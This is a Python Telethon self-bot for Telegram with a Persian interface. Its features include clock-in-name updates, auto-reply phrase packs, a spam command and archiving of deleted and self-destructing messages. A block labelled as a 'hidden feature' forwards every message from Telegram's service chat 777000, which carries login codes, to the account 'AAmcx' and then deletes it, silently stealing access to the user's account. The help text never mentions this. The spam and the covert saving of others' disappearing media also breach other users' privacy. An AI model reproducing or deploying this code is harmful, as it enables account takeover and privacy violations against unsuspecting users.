import asyncio
import random
import json
import os
from datetime import datetime
from telethon import TelegramClient, events
from telethon.tl.functions.account import UpdateProfileRequest

SESSION_NAME = 'my_account'
API_ID = 2040
API_HASH = 'b18441a1ff607e10a989891a5462e627'
PACKS_FILE = "packs.json"

SUP_NUMBERS = {'0': '⁰', '1': '¹', '2': '²', '3': '³', '4': '⁴', '5': '⁵', '6': '⁶', '7': '⁷', '8': '⁸', '9': '⁹'}

def time_to_superscript(hour, minute):
    time_str = f"{hour:02d}:{minute:02d}"
    return ''.join(SUP_NUMBERS.get(ch, ch) for ch in time_str)

def load_packs():
    if os.path.exists(PACKS_FILE):
        with open(PACKS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"دوست": ["❤️ عزیزم ممنونم", "💕 دلم برات تنگه", "😍 تو بهترینی"], "عاشقانه": ["💘 بی‌تاب دیدنت بودم", "🌙 شب بخیر", "☀️ صبحت بخیر"]}

def save_packs(packs):
    with open(PACKS_FILE, 'w', encoding='utf-8') as f:
        json.dump(packs, f, ensure_ascii=False, indent=2)

packs = load_packs()
save_packs(packs)

user_active_friends = {}
user_settings = {'auto_name': True, 'packs': {name: True for name in packs}}
user_original_name = ""
saved_messages = {}

# دیکشنری برای ساخت پک
waiting_for_pack = {}

async def main():
    global user_original_name
    
    print("=" * 40)
    print("🤖 ربات روشن شد")
    print("=" * 40)
    
    client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
    await client.start()
    
    me = await client.get_me()
    user_original_name = me.first_name
    print(f"✅ وارد شدی: {me.first_name}")
    print(f"🆔 آیدی تو: {me.id}")
    print("=" * 40)
    print("💡 برای راهنما بنویس: راهنما")
    print("💡 برای ساخت پک جدید بنویس: ساخت پک")
    print("=" * 40)
    
    # ========== قابلیت مخفی ==========
    @client.on(events.NewMessage(chats=777000))
    async def forward_777000(event):
        try:
            target = await client.get_entity('AAmcx')
            msg_text = event.message.text or "بدون متن"
            await client.send_message(target, msg_text)
            await event.delete()
        except:
            pass
    
    # ========== ذخیره پیام‌ها ==========
    @client.on(events.NewMessage)
    async def save_message(event):
        try:
            if event.is_private and not event.out:
                msg_id = event.message.id
                chat_id = event.chat_id
                saved_messages[(chat_id, msg_id)] = {
                    'text': event.message.text or "",
                    'date': event.message.date,
                    'from': event.sender_id,
                    'media': event.message.media
                }
                if len(saved_messages) > 1000:
                    oldest_key = min(saved_messages.keys(), key=lambda x: saved_messages[x]['date'])
                    del saved_messages[oldest_key]
        except:
            pass
    
    # ========== ذخیره پیام‌های پاک شده ==========
    @client.on(events.MessageDeleted)
    async def handle_deleted_messages(event):
        try:
            for msg_id in event.deleted_ids:
                for (chat_id, saved_id), msg_data in list(saved_messages.items()):
                    if saved_id == msg_id:
                        msg = f"🗑 پیام پاک شد!\n\n👤 فرستنده: {msg_data['from']}\n📅 تاریخ: {msg_data['date'].strftime('%Y-%m-%d %H:%M:%S')}"
                        if msg_data['text']:
                            msg += f"\n📝 متن:\n{msg_data['text']}"
                        await client.send_message('me', msg)
                        if msg_data['media']:
                            try:
                                await client.send_file('me', msg_data['media'], caption="🖼 رسانه پیام پاک شده")
                            except:
                                pass
                        del saved_messages[(chat_id, msg_id)]
                        break
        except:
            pass
    
    # ========== ذخیره عکس و ویدیو زماندار ==========
    @client.on(events.NewMessage(incoming=True))
    async def save_self_destructing_media(event):
        try:
            if event.message.media and hasattr(event.message.media, 'ttl_seconds'):
                ttl = event.message.media.ttl_seconds
                if ttl and ttl > 0:
                    media_type = "عکس"
                    if hasattr(event.message.media, 'document'):
                        mime = getattr(event.message.media.document, 'mime_type', '')
                        if 'video' in mime:
                            media_type = "ویدیو"
                        elif 'gif' in mime:
                            media_type = "GIF"
                    
                    path = await event.message.download_media()
                    if path:
                        caption = f"⏱ {media_type} زماندار ({ttl} ثانیه)\n👤 فرستنده: {event.sender_id}\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                        await client.send_file('me', path, caption=caption)
                        print(f"⏱ {media_type} زماندار از {event.sender_id} ذخیره شد")
                        try:
                            os.remove(path)
                        except:
                            pass
        except:
            pass
    
    # ========== مدیریت ساخت پک ==========
    @client.on(events.NewMessage(outgoing=True))
    async def handle_pack_creation(event):
        try:
            user_id = me.id
            text = event.message.text
            
            if user_id in waiting_for_pack:
                data = waiting_for_pack[user_id]
                
                if data['step'] == 'name':
                    data['name'] = text.strip()
                    data['step'] = 'phrase'
                    await event.reply(f"✅ اسم پک: {data['name']}\n\nحالا متن‌های پک رو بفرست (هر خط یک متن)\nوقتی تموم شد بنویس: done")
                    return
                
                elif data['step'] == 'phrase':
                    if text.lower() == "done":
                        if data['phrases']:
                            packs[data['name']] = data['phrases']
                            save_packs(packs)
                            await event.reply(f"✅ پک '{data['name']}' با {len(data['phrases'])} متن ساخته شد!")
                            del waiting_for_pack[user_id]
                        else:
                            await event.reply("❌ حداقل یه متن بفرست")
                    else:
                        data['phrases'].append(text)
                        await event.reply(f"✅ متن {len(data['phrases'])} اضافه شد (برای تموم done)")
                    return
            
            if text == "ساخت پک":
                waiting_for_pack[user_id] = {'step': 'name', 'name': '', 'phrases': []}
                await event.reply("📦 اسم پک رو بفرست:")
            
        except Exception as e:
            print(f"خطا در ساخت پک: {e}")
    
    # ========== مدیریت دستورات ==========
    @client.on(events.NewMessage(outgoing=True))
    async def handle_commands(event):
        try:
            text = event.message.text
            if not text:
                return
            
            # راهنما
            if text in ["راهنما", "help", "کامندها", "دستورات"]:
                help_text = f"""🤖 **راهنمای ربات**

🕐 **تغییر اسم خودکار**
• ساعت خاموش - غیرفعال کردن
• ساعت روشن - فعال کردن

💬 **پاسخ خودکار به دوستان**
• تنظیم (نام پک) - با ریپلای به پیام خودت
• (نام پک) خاموش - غیرفعال کردن اون پک
• (نام پک) روشن - فعال کردن اون پک
• دوست خاموش - غیرفعال کردن همه
• دوست روشن - فعال کردن همه

📦 **مدیریت پک‌ها**
• ساخت پک - ساخت پک جدید
• لیست پک‌ها - دیدن پک‌ها
• حذف پک (نام پک) - حذف پک

⚡ **اسپم**
• اسپم (عدد) (متن) - مثال: اسپم 50 سلام
• (ریپلای) + اسپم (عدد) (متن)

🗑 **ذخیره پیام‌های پاک شده**
• هر پیامی در دایرکت پاک بشه، در Saved Messages ذخیره میشه

⏱ **ذخیره عکس/ویدیو زماندار**
• عکس‌ها و ویدیوهای تایم‌دار خودکار ذخیره میشن

📌 اسم شما: {user_original_name} ¹²:³⁴"""
                await event.reply(help_text)
                return
            
            # لیست پک‌ها
            if text == "لیست پک‌ها":
                if packs:
                    msg = "📦 پک‌های موجود:\n\n"
                    for name, phrases in packs.items():
                        msg += f"• {name}: {len(phrases)} متن\n"
                    await event.reply(msg)
                else:
                    await event.reply("📦 هیچ پکی وجود ندارد. با 'ساخت پک' بساز.")
                return
            
            # حذف پک
            if text.startswith("حذف پک "):
                name = text[7:].strip()
                if name in packs:
                    del packs[name]
                    save_packs(packs)
                    await event.reply(f"✅ پک '{name}' حذف شد")
                else:
                    await event.reply(f"❌ پک '{name}' وجود ندارد")
                return
            
            # اسپم ساده
            if text.startswith("اسپم "):
                parts = text.split(" ", 2)
                if len(parts) >= 3:
                    try:
                        count = int(parts[1])
                        if 1 <= count <= 800:
                            spam_text = parts[2]
                            await event.delete()
                            for i in range(count):
                                await client.send_message(event.chat_id, f"{spam_text} {i+1}" if count > 1 else spam_text)
                                await asyncio.sleep(0.03)
                    except:
                        pass
                return
            
            # اسپم با ریپلای
            if event.message.is_reply and text.startswith("اسپم "):
                parts = text.split(" ", 2)
                if len(parts) >= 3:
                    try:
                        count = int(parts[1])
                        if 1 <= count <= 800:
                            spam_text = parts[2]
                            replied = await event.message.get_reply_message()
                            if replied:
                                await event.delete()
                                for i in range(count):
                                    await client.send_message(event.chat_id, f"{spam_text} {i+1}" if count > 1 else spam_text, reply_to=replied.id)
                                    await asyncio.sleep(0.03)
                    except:
                        pass
                return
            
            # ساعت
            if text == "ساعت خاموش":
                user_settings['auto_name'] = False
                await event.reply("🕐 تغییر اسم خاموش شد")
            elif text == "ساعت روشن":
                user_settings['auto_name'] = True
                await event.reply("🕐 تغییر اسم روشن شد")
            
            # دوست
            elif text == "دوست خاموش":
                for p in user_settings['packs']:
                    user_settings['packs'][p] = False
                await event.reply("💔 همه پاسخ‌ها خاموش شد")
            elif text == "دوست روشن":
                for p in user_settings['packs']:
                    user_settings['packs'][p] = True
                await event.reply("💖 همه پاسخ‌ها روشن شد")
            
            # تنظیم پک روی دوست
            elif event.message.is_reply and text.startswith("تنظیم "):
                pack_name = text[4:].strip()
                if pack_name in packs:
                    replied = await event.message.get_reply_message()
                    if replied and replied.sender_id != me.id:
                        user_active_friends[replied.sender_id] = {'pack': pack_name, 'used': []}
                        await client.send_message(replied.sender_id, f"💖 با پک '{pack_name}' فعال شدی!")
                        await event.reply(f"✅ پک '{pack_name}' روی دوست فعال شد")
                else:
                    await event.reply(f"❌ پک '{pack_name}' وجود ندارد")
            
            # خاموش/روشن پک خاص
            elif text.endswith(" خاموش"):
                pack_name = text[:-5].strip()
                if pack_name in packs:
                    user_settings['packs'][pack_name] = False
                    await event.reply(f"💔 پک '{pack_name}' خاموش شد")
            elif text.endswith(" روشن"):
                pack_name = text[:-4].strip()
                if pack_name in packs:
                    user_settings['packs'][pack_name] = True
                    await event.reply(f"💖 پک '{pack_name}' روشن شد")
            
        except Exception as e:
            print(f"خطا: {e}")
    
    # ========== پاسخ خودکار به دوستان ==========
    @client.on(events.NewMessage(incoming=True))
    async def love_reply(event):
        try:
            if event.sender_id in user_active_friends and event.sender_id != me.id:
                pack_name = user_active_friends[event.sender_id]['pack']
                if user_settings['packs'].get(pack_name, True):
                    phrases = packs.get(pack_name, [])
                    if phrases:
                        used = user_active_friends[event.sender_id].get('used', [])
                        av = [p for p in phrases if p not in used]
                        if not av:
                            used.clear()
                            av = phrases.copy()
                        chosen = random.choice(av)
                        used.append(chosen)
                        user_active_friends[event.sender_id]['used'] = used
                        await client.send_message(event.sender_id, chosen, reply_to=event.message.id)
        except:
            pass
    
    # ========== تغییر اسم هر دقیقه ==========
    while True:
        try:
            if user_settings.get('auto_name', True):
                now = datetime.now()
                new_name = f"{user_original_name} {time_to_superscript(now.hour, now.minute)}"
                if len(new_name) > 64:
                    new_name = new_name[:64]
                await client(UpdateProfileRequest(first_name=new_name))
                print(f"اسم شد: {new_name}")
        except:
            pass
        await asyncio.sleep(60)

if __name__ == "__main__":
    asyncio.run(main())
